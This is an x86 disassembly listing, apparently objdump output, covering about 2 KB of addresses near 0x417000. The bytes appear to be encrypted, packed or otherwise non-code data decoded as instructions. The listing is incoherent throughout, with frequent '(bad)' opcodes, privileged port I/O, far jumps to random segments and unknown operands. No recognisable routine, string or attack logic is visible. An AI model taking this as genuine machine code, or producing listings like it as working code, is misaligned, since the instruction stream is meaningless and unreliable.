  41701e:	clc    
  41701f:	jo     0x41708d
  417021:	dec    ebp
  417022:	pop    esp
  417023:	mov    ecx,0x72ea8cab
  417028:	and    eax,0x9fa858a7
  41702d:	push   ss
  41702e:	jle    0x416fed
  417030:	psubsw mm4,mm7
  417033:	test   al,0x79
  417035:	push   cs
  417036:	sbb    eax,0x8adfb456
  41703b:	push   ecx
  41703c:	push   0xe2e604d5
  417041:	dec    ecx
  417042:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417043:	and    edi,edi
  417045:	xor    ecx,DWORD PTR [esi]
  417047:	pop    ss
  417048:	xor    dh,BYTE PTR [edi]
  41704a:	sar    DWORD PTR [edx+0x33e46665],1
  417050:	adc    al,0x5
  417052:	sbb    al,0xfe
  417054:	mov    dh,0xd7
  417056:	dec    edx
  417057:	int3   
  417058:	add    edi,DWORD PTR [ebx+0x19e5f815]
  41705e:	sbb    eax,0xce3adbd9
  417063:	xchg   ebx,eax
  417064:	ror    DWORD PTR [eax+eiz*1],1
  417067:	js     0x416fee
  417069:	and    eax,0xb48a01d7
  41706e:	lock inc ebx
  417070:	std    
  417071:	dec    edx
  417072:	ins    BYTE PTR es:[edi],dx
  417073:	xor    BYTE PTR [eax],cl
  417075:	sub    eax,0xca5bf4c0
  41707a:	sbb    edi,DWORD PTR [esi-0x5b98c8d2]
  417080:	(bad)  
  417081:	call   0xe66bfea2
  417086:	out    0x7e,al
  417088:	stos   BYTE PTR es:[edi],al
  417089:	push   esp
  41708a:	int    0x8a
  41708c:	rcr    BYTE PTR [ebp+0x18eff6b9],cl
  417092:	xchg   esp,eax
  417093:	dec    edx
  417094:	retf   
  417095:	mov    BYTE PTR [esi+0x4a],ch
  417098:	std    
  417099:	dec    ecx
  41709a:	mov    ds:0xac3be87a,eax
  41709f:	out    0xcb,al
  4170a1:	push   esp
  4170a2:	cmp    cl,BYTE PTR [ebp+0x342195f6]
  4170a8:	jbe    0x4170cd
  4170aa:	(bad)  
  4170ab:	pop    edi
  4170ac:	xlat   BYTE PTR ds:[ebx]
  4170ad:	push   0xe00a4164
  4170b2:	mov    esp,0xf2d6fe37
  4170b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170b8:	neg    DWORD PTR [eax-0x61]
  4170bb:	cdq    
  4170bc:	pushf  
  4170bd:	adc    BYTE PTR [esi+0x46],dl
  4170c0:	test   BYTE PTR [eax-0x65],dh
  4170c3:	pop    esp
  4170c4:	mov    bl,0xd
  4170c6:	cwde   
  4170c7:	sbb    al,0xf6
  4170c9:	inc    ecx
  4170ca:	mov    al,0x81
  4170cc:	(bad)  
  4170cd:	mov    ch,0x5b
  4170cf:	call   FWORD PTR [edi+0x7c]
  4170d2:	scas   al,BYTE PTR es:[edi]
  4170d3:	in     eax,0xf
  4170d5:	jne    0x41705f
  4170d7:	test   eax,0x92058f68
  4170dc:	sub    DWORD PTR [ebp+0x46538725],eax
  4170e2:	mov    BYTE PTR [edx+0x58832c3c],dh
  4170e8:	pop    es
  4170e9:	cmp    al,0x26
  4170eb:	dec    esi
  4170ec:	cs pop ebp
  4170ee:	pop    ebp
  4170ef:	jns    0x4170a3
  4170f1:	out    0xf0,eax
  4170f3:	ror    BYTE PTR [ecx+edi*2+0x2b],cl
  4170f7:	das    
  4170f8:	sti    
  4170f9:	imul   edi,esi,0xffffffce
  4170fc:	js     0x41710a
  4170fe:	pop    ebp
  4170ff:	jmp    0x4170a9
  417101:	scas   al,BYTE PTR es:[edi]
  417102:	jnp    0x41708b
  417104:	sbb    BYTE PTR [edx+0xf],0xca
  417108:	jbe    0x41713d
  41710a:	jmp    0x55a7:0x7e6a451
  417111:	dec    esp
  417112:	sub    al,0x73
  417114:	das    
  417115:	stos   BYTE PTR es:[edi],al
  417116:	inc    ebx
  417117:	and    al,0xef
  417119:	jmp    0x4170f8
  41711b:	mov    eax,ds:0xe9899d98
  417120:	(bad)
  417123:	push   ds
  417124:	pop    ss
  417125:	enter  0x9229,0x4a
  417129:	xor    al,0x61
  41712b:	pop    ecx
  41712c:	mov    dh,0xab
  41712e:	pop    esi
  41712f:	jo     0x4170f8
  417131:	xchg   ecx,eax
  417132:	scas   al,BYTE PTR es:[edi]
  417133:	jb     0x417118
  417135:	sub    al,0xc
  417137:	imul   ebx,DWORD PTR [ebp+0x4452d67a],0xffffffad
  41713e:	mov    DWORD PTR [ebp+0x73],ebx
  417141:	pop    esp
  417142:	xchg   esp,eax
  417143:	dec    esi
  417144:	add    BYTE PTR [esi+0xcf5b60],bh
  41714a:	push   ss
  41714b:	retf   0xf5dd
  41714e:	and    DWORD PTR [ebp+0xa],0x2e40a1c6
  417155:	push   es
  417156:	mov    ds:0x1a056b8f,eax
  41715b:	out    0x96,al
  41715d:	shl    DWORD PTR [ecx+0x2e],1
  417160:	cmp    ch,BYTE PTR [edi+0x64]
  417163:	pop    ebx
  417164:	xor    dl,al
  417166:	mov    dh,0x4f
  417168:	dec    edx
  417169:	nop
  41716a:	in     eax,0x7d
  41716c:	not    DWORD PTR [edx-0x20c349df]
  417172:	inc    eax
  417173:	iret   
  417174:	dec    eax
  417175:	dec    ebp
  417176:	call   0xc726:0xb6552af4
  41717d:	iret   
  41717e:	jl     0x41718c
  417180:	outs   dx,BYTE PTR ds:[esi]
  417181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417182:	retf   0x3b86
  417185:	std    
  417186:	scas   al,BYTE PTR es:[edi]
  417187:	(bad)
  41718a:	xchg   ecx,eax
  41718b:	cmp    ah,BYTE PTR [esi-0x8]
  41718e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41718f:	mov    ds:0x3e9fbd69,eax
  417194:	mov    esp,0xd4d34e96
  417199:	jmp    0x11a9:0xd63b0a9f
  4171a0:	sub    DWORD PTR [eax+0x6643688c],eax
  4171a6:	loope  0x4171ac
  4171a8:	sbb    al,0x35
  4171aa:	pop    esp
  4171ab:	add    BYTE PTR [eax-0x587eab41],bl
  4171b1:	mov    bl,0x82
  4171b3:	cmp    DWORD PTR [edx-0x75b32051],esp
  4171b9:	cs add al,0x33
  4171bc:	imul   esp,DWORD PTR [eax],0xed3e77e3
  4171c2:	fcomp  st(0)
  4171c4:	call   0x5c6:0x6b0c585f
  4171cb:	fnop   
  4171cd:	daa    
  4171ce:	push   es
  4171cf:	push   edi
  4171d0:	xor    ecx,0x83e28928
  4171d6:	and    cl,BYTE PTR [esi]
  4171d8:	push   0x72
  4171da:	cmp    ch,al
  4171dc:	jecxz  0x417207
  4171de:	pop    es
  4171df:	inc    edx
  4171e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171e1:	(bad)  
  4171e3:	sub    esi,DWORD PTR [edi+0x1f]
  4171e6:	jns    0x417200
  4171e8:	lds    esi,FWORD PTR [ebx+edx*1+0x3bbd4b95]
  4171ef:	xchg   edi,eax
  4171f0:	lods   eax,DWORD PTR ds:[esi]
  4171f1:	pop    eax
  4171f2:	pop    ss
  4171f3:	add    DWORD PTR [ebx],eax
  4171f5:	stc    
  4171f6:	ins    BYTE PTR es:[edi],dx
  4171f7:	sub    DWORD PTR [edx],ebx
  4171f9:	fs repz and al,0xcf
  4171fd:	dec    edi
  4171fe:	cmp    DWORD PTR [eax+edi*8+0x2a280e4a],esi
  417205:	mov    al,al
  417207:	fdiv   DWORD PTR [ebx-0x30]
  41720a:	xchg   esp,eax
  41720b:	xchg   ebx,eax
  41720c:	dec    esi
  41720d:	and    eax,0x32a937fc
  417212:	sbb    ch,0x16
  417215:	shr    BYTE PTR [eax-0x16],cl
  417218:	pop    ebx
  417219:	pop    ecx
  41721a:	jnp    0x417221
  41721c:	inc    ebp
  41721d:	ret    0x1e95
  417220:	mov    BYTE PTR [esp+ecx*1],bh
  417223:	dec    esi
  417224:	xchg   BYTE PTR ss:[ebp-0x173696e9],ah
  41722b:	sbb    edx,ebx
  41722d:	push   0xae45ae3
  417232:	(bad)  
  417233:	mov    dl,0x65
  417235:	test   eax,0x5ffb3738
  41723a:	out    dx,eax
  41723b:	dec    eax
  41723c:	push   esi
  41723d:	mov    ebp,?
  41723f:	pop    edi
  417240:	stos   BYTE PTR es:[edi],al
  417241:	sub    BYTE PTR [ecx+0x3ac02b18],cl
  417247:	retf   0x213e
  41724a:	retf   0x6376
  41724d:	cwde   
  41724e:	pop    ecx
  41724f:	adc    DWORD PTR [eax+0x4bca55e9],ebx
  417255:	xor    al,0xe9
  417257:	sub    ah,ah
  417259:	ror    BYTE PTR [ecx-0x1c],0xa5
  41725d:	sub    BYTE PTR [ebp-0x1f],cl
  417260:	mov    eax,0x2e04fe31
  417265:	pushf  
  417266:	jns    0x41726f
  417268:	dec    ebx
  417269:	mov    esp,0xf8945804
  41726e:	lahf   
  41726f:	imul   esi,DWORD PTR [ebx],0x1ebcc5c
  417275:	cmc    
  417276:	cmp    dh,dl
  417278:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417279:	add    al,0xcf
  41727b:	mov    edx,0x8d852ab2
  417280:	pusha  
  417281:	and    DWORD PTR [ebx],esp
  417283:	fs or  ecx,ebx
  417286:	pop    es
  417287:	inc    esp
  417288:	(bad)  
  417289:	ror    DWORD PTR [edi+0x8df08e0],cl
  41728f:	push   es
  417290:	sbb    eax,0x1907f856
  417295:	xchg   ebp,eax
  417296:	push   cs
  417297:	mov    dh,0x4b
  417299:	xchg   edx,eax
  41729a:	mov    bl,0xef
  41729c:	mov    ?,WORD PTR [esp+esi*8+0x75df46ed]
  4172a3:	and    BYTE PTR [edi+0xa],bl
  4172a6:	xchg   esi,eax
  4172a7:	aas    
  4172a8:	pop    ecx
  4172a9:	and    eax,0x71b24cf9
  4172ae:	jbe    0x41728c
  4172b0:	sub    BYTE PTR [edi-0x77],al
  4172b3:	sub    DWORD PTR [eax+0x4a],esi
  4172b6:	sbb    BYTE PTR [esi],cl
  4172b8:	gs ins DWORD PTR es:[edi],dx
  4172ba:	test   eax,0xd65eb0c0
  4172bf:	pop    esi
  4172c0:	xchg   esi,eax
  4172c1:	(bad)  
  4172c2:	mov    bl,0xa7
  4172c4:	cmp    dl,ah
  4172c6:	sub    al,0x94
  4172c8:	and    BYTE PTR [edi+0x36091906],al
  4172ce:	(bad)  [edi-0x441d8826]
  4172d4:	mov    al,ds:0x7f600b20
  4172d9:	mov    al,0xaf
  4172db:	(bad)  
  4172dc:	test   al,0xf4
  4172de:	sbb    DWORD PTR [ebx],ebp
  4172e0:	je     0x41729e
  4172e2:	sar    BYTE PTR [ebp+0x4b],0x91
  4172e6:	push   eax
  4172e7:	or     eax,DWORD PTR [ebp-0x43aceb57]
  4172ed:	add    BYTE PTR [esi+eiz*2-0x4f],ch
  4172f1:	or     BYTE PTR [ebx-0x1c4d8cf0],0x81
  4172f8:	jne    0x41733c
  4172fa:	xchg   ebp,eax
  4172fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172fc:	and    DWORD PTR ds:0x62311e5a,esp
  417302:	jne    0x417286
  417304:	push   esp
  417305:	adc    dh,BYTE PTR [ebx+0x6b]
  417308:	pop    eax
  417309:	xchg   ebp,eax
  41730a:	rol    BYTE PTR [edi+esi*4-0x6b0601e7],1
  417311:	inc    ebp
  417312:	mov    WORD PTR [eax],cs
  417314:	fbld   TBYTE PTR [eax+0x5]
  417317:	sbb    al,0x3c
  417319:	jo     0x417381
  41731b:	mov    cl,0x2d
  41731d:	rol    DWORD PTR [ebx-0x7d72993f],1
  417323:	cwde   
  417324:	repnz push ebx
  417326:	test   BYTE PTR [esi],ah
  417328:	sbb    BYTE PTR [esi-0x1d],bl
  41732b:	and    DWORD PTR [eax+0x5d345688],edx
  417331:	mov    bl,0xb
  417333:	and    al,0x14
  417335:	dec    ebp
  417336:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417337:	into   
  417338:	sbb    ebp,esp
  41733a:	frstor [eax-0x4a]
  41733d:	and    DWORD PTR [esi+0x26],ebx
  417340:	les    edi,FWORD PTR [ebp+0x3e]
  417343:	test   eax,0xf93c6d9b
  417348:	mov    edi,0x992bae63
  41734d:	in     al,0xe
  41734f:	jmp    esp
  417351:	dec    esi
  417352:	sub    eax,0x95302e8c
  417357:	adc    DWORD PTR [edi],esi
  417359:	or     BYTE PTR [ebx-0x4c],al
  41735c:	cli    
  41735d:	popa   
  41735e:	fmulp  st(7),st
  417360:	leave  
  417361:	js     0x4172fa
  417363:	adc    BYTE PTR [edx+edx*8+0x78],dh
  417367:	mov    ecx,0x322acbc1
  41736c:	adc    ebp,ecx
  41736e:	test   WORD PTR [esi-0xc],di
  417372:	aaa    
  417373:	iret   
  417374:	sar    al,1
  417376:	sti    
  417377:	dec    edx
  417378:	sub    eax,0xa1161a6b
  41737d:	push   ebp
  41737e:	and    al,0x64
  417380:	pop    es
  417381:	and    al,BYTE PTR [ecx+0x3ef47b33]
  417387:	mov    ds:0x192a491f,al
  41738c:	cmp    bl,BYTE PTR [ebp+0x38]
  41738f:	dec    eax
  417390:	inc    esi
  417391:	les    ecx,FWORD PTR [edx+0x50]
  417394:	dec    edx
  417395:	xor    al,0xdc
  417397:	int    0x3c
  417399:	mov    DWORD PTR [edi-0x5c2c5aab],ebx
  41739f:	std    
  4173a0:	mov    DWORD PTR [edx],edi
  4173a2:	jge    0x4173f6
  4173a4:	lock or DWORD PTR [ebx-0xf4991bb],ecx
  4173ab:	xor    BYTE PTR [ebp+0x5b],bh
  4173ae:	div    edi
  4173b0:	add    eax,0xd4f1af15
  4173b5:	bnd jmp 0xe760486e
  4173bb:	sti    
  4173bc:	jle    0x417358
  4173be:	ins    DWORD PTR es:[edi],dx
  4173bf:	retf   0x5d9d
  4173c2:	shr    ecx,0x7e
  4173c5:	pushf  
  4173c6:	mov    dl,0xaa
  4173c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173c9:	pop    ebx
  4173ca:	test   eax,0xe6da047a
  4173cf:	mov    ds,WORD PTR [ebx+0x70]
  4173d2:	xor    eax,0xdb3bc3ed
  4173d7:	dec    ebx
  4173d8:	jne    0x417376
  4173da:	push   ecx
  4173db:	sub    DWORD PTR [ebp+0x70],ebp
  4173de:	in     eax,0x65
  4173e0:	es jnp 0x417424
  4173e3:	mov    WORD PTR [edx],?
  4173e5:	or     edi,ebp
  4173e7:	inc    eax
  4173e8:	push   esi
  4173e9:	cld    
  4173ea:	jecxz  0x41740a
  4173ec:	push   0xffffffa9
  4173ee:	mov    ds:0x74bb7650,al
  4173f3:	or     ecx,DWORD PTR [edi+0x7dee69a6]
  4173f9:	in     al,dx
  4173fa:	cld    
  4173fb:	inc    ebp
  4173fc:	add    BYTE PTR [ecx+0x69970a0a],0xa1
  417403:	pop    ds
  417404:	aad    0x69
  417406:	stc    
  417407:	push   ebp
  417408:	jbe    0x417407
  41740a:	test   al,0x25
  41740c:	xchg   ebx,eax
  41740d:	xor    edx,edi
  41740f:	js     0x417485
  417411:	jne    0x4173b4
  417413:	mov    ebx,esp
  417415:	and    edx,ecx
  417417:	rol    DWORD PTR ss:[ecx+edx*8],1
  41741b:	js     0x41748a
  41741d:	test   al,0xa3
  41741f:	out    0x28,al
  417421:	out    dx,eax
  417422:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417423:	mov    esp,0xf3c300a3
  417428:	inc    edx
  417429:	je     0x4174a3
  41742b:	dec    edi
  41742c:	(bad)  
  41742d:	(bad)  
  41742e:	ins    DWORD PTR es:[edi],dx
  41742f:	and    esi,DWORD PTR [edi+0xc]
  417432:	push   ecx
  417433:	pop    edi
  417434:	clc    
  417435:	inc    ecx
  417436:	sub    ah,BYTE PTR [eax]
  417438:	cli    
  417439:	shr    DWORD PTR [eax+0x3ad1bcfc],cl
  41743f:	push   esi
  417440:	addr16 test cl,bh
  417443:	jb     0x4173f1
  417445:	(bad)  
  417446:	aaa    
  417447:	ret    0x590a
  41744a:	int3   
  41744b:	shr    DWORD PTR [edx-0x4f8e3977],1
  417451:	cmp    bl,BYTE PTR [edx-0x6e0a67b5]
  417457:	stos   DWORD PTR es:[edi],eax
  417458:	pop    edi
  417459:	idiv   DWORD PTR [edi-0x4f8cc3c5]
  41745f:	sahf   
  417460:	data16 mov cl,0x32
  417463:	scas   eax,DWORD PTR es:[edi]
  417464:	and    al,0x64
  417466:	xchg   ebx,eax
  417467:	pop    ecx
  417468:	mov    eax,0xa174305c
  41746d:	(bad)  
  41746e:	test   eax,0x319956cb
  417473:	test   eax,0x3cd7d918
  417478:	adc    bl,BYTE PTR [edi-0x48]
  41747b:	and    bh,bl
  41747d:	out    0x60,al
  41747f:	adc    al,0xac
  417481:	xchg   edx,eax
  417482:	imul   ebp,edi,0x19
  417485:	retf   0xa61b
  417488:	xchg   edi,eax
  417489:	sub    BYTE PTR [ebx-0x468c82af],ah
  41748f:	ins    DWORD PTR es:[edi],dx
  417490:	and    esp,DWORD PTR [edx-0x3b]
  417493:	int    0x6a
  417495:	cmp    BYTE PTR [ebx+0x0],bh
	...
  417513:	add    ch,dl
  417515:	and    BYTE PTR [eax-0x4],0x75
  417519:	cld    
  41751a:	(bad)  [ecx+0x32bc8e94]
  417520:	jo     0x417576
  417522:	int3   
  417523:	aad    0x31
  417525:	sbb    BYTE PTR [ecx],al
  417527:	add    BYTE PTR [ebx+0x7],ch
  41752a:	add    BYTE PTR [eax],al
  41752c:	test   edi,ebx
  41752e:	adc    eax,0x4562467f
  417533:	push   ecx
  417534:	sbb    DWORD PTR [edx+eax*8-0x1a],eax
  417538:	mov    bl,0x4b
  41753a:	daa    
  41753b:	pop    ecx
  41753c:	mov    al,0xbf
  41753e:	adc    al,BYTE PTR [edi+ecx*8-0x70]
  417542:	out    0xf7,al
  417544:	fisubr WORD PTR [edx+0x68]
  417547:	sub    ah,bl
  417549:	out    0x53,al
  41754b:	xchg   BYTE PTR [esi+0x35],bl
  41754e:	xor    BYTE PTR [ecx],0x9c
  417551:	or     edi,eax
  417553:	aad    0x3b
  417555:	enter  0xef10,0xa8
  417559:	mov    edx,0xa6865c9d
  41755e:	arpl   bx,sp
  417560:	(bad)  
  417561:	xchg   esp,eax
  417562:	xchg   esp,eax
  417563:	mov    cl,0x22
  417565:	in     al,0x68
  417567:	in     al,dx
  417568:	fldcw  WORD PTR [edi+0x1c]
  41756b:	add    al,0xee
  41756d:	arpl   sp,ax
  41756f:	adc    ch,ch
  417571:	outs   dx,BYTE PTR ds:[esi]
  417572:	lds    edx,FWORD PTR [edi]
  417574:	mov    bl,0x56
  417576:	fs icebp 
  417578:	xchg   ebx,eax
  417579:	ins    BYTE PTR es:[edi],dx
  41757a:	mov    edx,0x26e5b1e1
  41757f:	jecxz  0x417554
  417581:	jg     0x417601
  417583:	mov    cl,0xac
  417585:	xor    al,0x15
  417587:	mov    ah,0x18
  417589:	in     eax,dx
  41758a:	sbb    ecx,edx
  41758c:	ins    BYTE PTR es:[edi],dx
  41758d:	scas   eax,DWORD PTR es:[edi]
  41758e:	cdq    
  41758f:	jle    0x417564
  417591:	sbb    bh,BYTE PTR [esi]
  417593:	push   esp
  417594:	jp     0x417585
  417596:	jbe    0x41753c
  417598:	xchg   ebx,eax
  417599:	addr16 mov cl,0xbf
  41759c:	shl    DWORD PTR [ecx-0x1f],1
  41759f:	sub    ch,BYTE PTR [eax+0x37f8ac0f]
  4175a5:	int    0x46
  4175a7:	mov    cl,0xf8
  4175a9:	and    BYTE PTR [eax+edi*4],bl
  4175ac:	sbb    esi,eax
  4175ae:	and    BYTE PTR [edx],bh
  4175b0:	add    dh,BYTE PTR [eax]
  4175b2:	int3   
  4175b3:	inc    ebx
  4175b4:	int3   
  4175b5:	sbb    dh,ch
  4175b7:	dec    ebx
  4175b8:	ja     0x41761a
  4175ba:	push   ecx
  4175bb:	pop    ebx
  4175bc:	(bad)  
  4175bd:	jecxz  0x4175f2
  4175bf:	cmc    
  4175c0:	adc    bl,bl
  4175c2:	lea    edi,[ebx+0x30]
  4175c5:	xchg   BYTE PTR [ecx+0x356e5ee7],cl
  4175cb:	cmp    ch,BYTE PTR [edi-0x734d289e]
  4175d1:	hlt    
  4175d2:	into   
  4175d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175d4:	dec    edx
  4175d5:	fdiv   DWORD PTR [ecx]
  4175d7:	test   DWORD PTR [edx],ecx
  4175d9:	jbe    0x417562
  4175db:	scas   eax,DWORD PTR es:[edi]
  4175dc:	pop    ecx
  4175dd:	(bad)  
  4175de:	je     0x41760e
  4175e0:	test   al,0xd3
  4175e2:	push   0xf38c1cfa
  4175e7:	adc    DWORD PTR [edx],ebx
  4175e9:	loop   0x41757e
  4175eb:	cdq    
  4175ec:	sbb    BYTE PTR ds:0x1171eeda,al
  4175f2:	jno    0x417584
  4175f4:	sub    eax,edx
  4175f6:	fnstcw WORD PTR [ebp+0x225b00aa]
  4175fc:	sbb    bh,al
  4175fe:	sbb    BYTE PTR cs:[eax],dl
  417601:	fnsave [ebp+0x76]
  417604:	mov    ebp,DWORD PTR [eax-0x11]
  417607:	shl    BYTE PTR [edi+0x23a5f04f],1
  41760d:	cmp    BYTE PTR [edx],bh
  41760f:	repnz fsub st,st(6)
  417612:	imul   edx,DWORD PTR [edx+0x205cd9b6],0x2c
  417619:	in     eax,0x86
  41761b:	loope  0x417673
  41761d:	ror    esp,0x7b
  417620:	add    esp,ecx
  417622:	lods   eax,DWORD PTR ds:[esi]
  417623:	push   esp
  417624:	lods   al,BYTE PTR ds:[esi]
  417625:	push   esp
  417626:	bound  ebx,QWORD PTR [ecx-0x5b]
  417629:	call   0x3d468127
  41762e:	gs push es
  417630:	in     al,0xff
  417632:	(bad)  
  417633:	push   eax
  417634:	dec    ebx
  417635:	adc    eax,esp
  417637:	fild   DWORD PTR [edx+0x6b]
  41763a:	xor    DWORD PTR [esi+edx*4],0x4b01592
  417641:	add    al,0xbe
  417643:	call   0xb132:0x4a579b66
  41764a:	add    ch,BYTE PTR [ecx-0x4]
  41764d:	inc    eax
  41764e:	test   eax,0xf9a304b6
  417653:	dec    eax
  417654:	jo     0x417678
  417656:	gs push ss
  417658:	xor    ch,BYTE PTR [edi+eax*2]
  41765b:	aas    
  41765c:	neg    bl
  41765e:	jge    0x417666
  417660:	push   ds
  417661:	and    eax,0xc038f4ce
  417666:	imul   edx,DWORD PTR [ebx+0x45],0x7528384f
  41766d:	jge    0x4176ab
  41766f:	add    BYTE PTR [esi+0x6c],ah
  417672:	sbb    al,0xb3
  417674:	test   DWORD PTR [ecx],0xc5066101
  41767a:	adc    eax,0x7a1d1daf
  41767f:	sub    eax,0xf5a843ae
  417684:	inc    ecx
  417685:	sub    ebp,DWORD PTR [edx-0x30]
  417688:	aaa    
  417689:	sub    ebp,edi
  41768b:	add    bh,ah
  41768d:	icebp  
  41768e:	pop    edi
  41768f:	inc    edx
  417690:	add    bl,cl
  417692:	adc    esp,0xb8ba6a23
  417698:	repz pop ds
  41769a:	xchg   DWORD PTR [eax-0x35],eax
  41769d:	loope  0x417672
  41769f:	sub    al,0x9a
  4176a1:	lea    ebx,[eax]
  4176a3:	leave  
  4176a4:	mov    BYTE PTR [ebx],dh
  4176a6:	icebp  
  4176a7:	jle    0x4176ac
  4176a9:	aas    
  4176aa:	imul   cl
  4176ac:	mov    edx,0x913af9bb
  4176b1:	mov    ecx,0x95f0ea79
  4176b6:	push   ebx
  4176b7:	rol    ebx,1
  4176b9:	sbb    DWORD PTR [eax-0x4af148a2],eax
  4176bf:	iret   
  4176c0:	(bad)  
  4176c1:	ss in  al,0x94
  4176c4:	test   BYTE PTR [esp+ebp*1],bh
  4176c7:	loope  0x41767b
  4176c9:	inc    edi
  4176ca:	mov    cl,0x63
  4176cc:	stc    
  4176cd:	xchg   edx,eax
  4176ce:	fisttp WORD PTR [esi]
  4176d0:	sub    BYTE PTR [ebx-0x27],al
  4176d3:	ds repnz in eax,0x1
  4176d7:	out    dx,al
  4176d8:	inc    eax
  4176d9:	jle    0x417694
  4176db:	sti    
  4176dc:	jg     0x417744
  4176de:	cs mov esp,0x11487c3d
  4176e4:	sbb    edi,edx
  4176e6:	mov    ebp,0xd97aeeb2
  4176eb:	cwde   
  4176ec:	sub    eax,0x349d8409
  4176f1:	mov    edi,0x95a7ee14
  4176f6:	(bad)  
  4176f7:	iret   
  4176f8:	call   0x713033f3
  4176fd:	adc    ebp,eax
  4176ff:	ins    DWORD PTR es:[edi],dx
  417700:	fst    QWORD PTR [ebp+0x6e]
  417703:	mov    al,0x1
  417705:	mov    bh,0x6
  417707:	add    eax,DWORD PTR [ebp-0x43]
  41770a:	push   0x11
  41770c:	cli    
  41770d:	out    dx,al
  41770e:	pop    eax
  41770f:	ja     0x4176e0
  417711:	sbb    dl,BYTE PTR [ecx-0x76]
  417714:	es js  0x4176f8
  417717:	sbb    esp,edx
  417719:	cmp    ch,BYTE PTR [ebp-0x3228fde3]
  41771f:	test   BYTE PTR [ecx+0x4d25df0d],ch
  417725:	inc    ecx
  417726:	sbb    dh,dh
  417728:	mov    ds:0xa4897d01,eax
  41772d:	mov    edx,0xea40c491
  417732:	imul   edx,eax,0xab42998
  417738:	and    ecx,DWORD PTR [esi]
  41773a:	call   0xa7d1f642
  41773f:	scas   eax,DWORD PTR es:[edi]
  417740:	jbe    0x417798
  417742:	lock lds edi,FWORD PTR [edi]
  417745:	ror    edi,0x15
  417748:	pop    edi
  417749:	xchg   ebp,eax
  41774a:	call   0x19d42044
  41774f:	cld    
  417750:	imul   eax,eax,0x112d4f6a
  417756:	test   al,0xc3
  417758:	pop    esp
  417759:	jae    0x4176e4
  41775b:	inc    ebx
  41775c:	aad    0x41
  41775e:	mov    ebx,0xa50783ee
  417763:	loop   0x417739
  417765:	test   ch,bh
  417767:	sbb    ebx,ecx
  417769:	pop    ecx
  41776a:	pusha  
  41776b:	int3   
  41776c:	(bad)  
  41776d:	rcr    esi,cl
  41776f:	mov    WORD PTR [edx-0x5d],ds
  417772:	pop    esp
  417773:	adc    eax,0x47e23ed9
  417778:	addr16 mov dh,0x71
  41777b:	sbb    cl,BYTE PTR [ecx+0x3cf671af]
  417781:	xor    esi,edx
  417783:	mov    edx,0x2f60dc80
  417788:	or     eax,0xb864ca6b
  41778d:	pop    eax
  41778e:	pop    ebx
  41778f:	or     al,0xa5
  417792:	mov    ecx,esp
  417794:	lds    ebp,FWORD PTR [ebx]
  417796:	out    0x92,eax
  417798:	mov    ebx,0x751eeeb0
  41779d:	pop    esp
  41779e:	mov    esi,0xe758f274
  4177a3:	int3   
  4177a4:	dec    edx
  4177a5:	xlat   BYTE PTR ds:[ebx]
  4177a6:	mov    BYTE PTR [ecx+0x3931f957],cl
  4177ac:	jp     0x417817
  4177ae:	dec    esp
  4177af:	in     al,dx
  4177b0:	sub    DWORD PTR [edx+0x20],esp
  4177b3:	loope  0x41777d
  4177b5:	or     cl,BYTE PTR [edx]
  4177b7:	push   0x6e
  4177b9:	aaa    
  4177ba:	jo     0x4177be
  4177bc:	mov    ah,BYTE PTR [ecx-0x26]
  4177bf:	sub    al,0xbd
  4177c1:	xchg   WORD PTR [ecx],ax
  4177c4:	inc    ecx
  4177c5:	into   
  4177c6:	lea    ecx,[eax+edi*2+0x73]
  4177ca:	test   eax,0xf38fd01d
  4177cf:	bound  ebp,QWORD PTR ds:0xabf9d2f1
  4177d5:	stc    
  4177d6:	jnp    0x41783a
  4177d8:	or     ah,bl
  4177da:	mov    ebp,0xfe003544
  4177df:	xchg   ebp,eax
  4177e0:	cmc    
  4177e1:	lahf   
  4177e2:	xor    al,0x93
  4177e4:	std    
  4177e5:	pusha  
  4177e6:	frndint 
  4177e8:	lods   al,BYTE PTR ds:[esi]
  4177e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177ea:	imul   ecx,DWORD PTR [edx],0x4e2741e7
  4177f0:	and    ah,BYTE PTR [edi]
  4177f2:	icebp  
  4177f3:	sbb    DWORD PTR [ebx+0x1dc92e9d],0xffffffda
  4177fa:	cmc    
  4177fb:	lods   eax,DWORD PTR ds:[esi]
  4177fc:	fstp   TBYTE PTR [edi+0x4a]
  4177ff:	imul   ebp,DWORD PTR ds:0xcbfad6fa,0x2998431b
  417809:	arpl   WORD PTR [ebp+0x72],si
  41780c:	add    al,0xef
  41780e:	ret    0xf189
  417811:	lea    esp,[eax+0x6e]
  417814:	jb     0x417858
  417816:	je     0x4177c4
  417818:	cwde   
  417819:	mov    ch,dl
  41781b:	push   ss
  41781c:	arpl   WORD PTR ds:0xccf30e65,bp
  417822:	pop    ds
  417823:	add    ch,ah
  417825:	ret    
  417826:	in     al,dx
  417827:	adc    DWORD PTR [esi+0x79bec399],esp
  41782d:	dec    ebp
  41782e:	and    DWORD PTR [esi],ebp
  417830:	inc    ebx
  417831:	repz fadd QWORD PTR [ebx]
  417834:	daa    
  417835:	jl     0x417884
  417837:	pop    ebp
  417838:	push   edi
  417839:	mov    edx,0x53a3fa6f
  41783e:	loope  0x417872
  417840:	jp     0x417861
  417842:	cmp    eax,0xac83cfe8
  417847:	lods   eax,DWORD PTR ds:[esi]
  417848:	dec    esi
  417849:	push   esp
  41784a:	add    DWORD PTR [esi+0x5a],edx
  41784d:	cmp    edx,DWORD PTR [ebp*4-0x3b59ec60]
  417854:	ror    BYTE PTR [esi],0x46
  417857:	push   0x585579d2
  41785c:	add    eax,0x502d8462
  417861:	mov    ?,WORD PTR [ebp+0x26]
  417864:	mov    bh,0x1d
  417866:	cmp    eax,0xd243d80b
  41786b:	std    
  41786c:	dec    ecx
  41786d:	cmp    cl,BYTE PTR [eax-0x1e]
  417870:	adc    eax,0xffffffa8
  417873:	out    0x46,eax
  417875:	jo     0x41783b
